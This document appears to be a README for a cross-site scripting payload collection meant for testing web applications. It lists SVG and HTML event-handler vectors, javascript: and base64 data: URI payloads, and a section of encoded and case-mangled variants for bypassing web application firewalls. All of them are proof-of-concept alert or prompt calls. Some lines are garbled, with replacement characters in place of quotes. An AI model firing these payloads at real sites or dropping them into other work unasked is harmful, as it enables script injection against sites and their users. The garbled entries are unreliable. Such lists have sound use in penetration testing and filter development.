# XSS-Payloads
XSS Payloads collection for testing web application 

## Payloads

*SVG*
```javascript
<svg/onload=alert(1)><svg>
<svg
onload=alert(1)><svg> # newline char
<svg	onload=alert(1)><svg> # tab char
<svgonload=alert(1)><svg> # new page char (0xc)
```
*Standard HTML events*
```javascript
<body onload=alert()>
<img src=x onerror=alert()>
<svg onload=alert()>
<body onpageshow=alert(1)>
<div style="width:1000px;height:1000px" onmouseover=alert()></div>
<marquee width=10 loop=2 behavior="alternate" onbounce=alert()> (firefox only)
<marquee onstart=alert(1)> (firefox only)
<marquee loop=1 width=0 onfinish=alert(1)> (firefox only)
<input autofocus="" onfocus=alert(1)></input>
<details open ontoggle="alert()">  (chrome & opera only)
```

*Weird XSS vectors*
```javascript
<svg><animate onbegin=alert() attributeName=x></svg>
<object data="data:text/html,<script>alert(5)</script>">
<iframe srcdoc="<svg onload=alert(4);>">
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
```


<b>Bypass WAF </b>
```javascript
</script><svg><script>alert(1)-%26apos%3B
anythinglr00</script><script>alert(document.domain)</script>uxldz

anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
<a href=javas&#99;ript:alert(1)>
```

<b>Payloads</b>
```javascript
<script>alert(123);</script>
<ScRipT>alert("XSS");</ScRipT>
<script>alert(123)</script>
<script>alert("hellox worldss");</script>
<script>alert(�XSS�)</script> 
<script>alert(�XSS�);</script>
<script>alert(�XSS�)</script>
�><script>alert(�XSS�)</script>
<script>alert(/XSS�)</script>
<script>alert(/XSS/)</script>
</script><script>alert(1)</script>
�; alert(1);
�)alert(1);//
<ScRiPt>alert(1)</sCriPt>
<IMG SRC=jAVasCrIPt:alert(�XSS�)>
<IMG SRC=�javascript:alert(�XSS�);�>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert(�XSS�)>      
<img src=xss onerror=alert(1)>
```
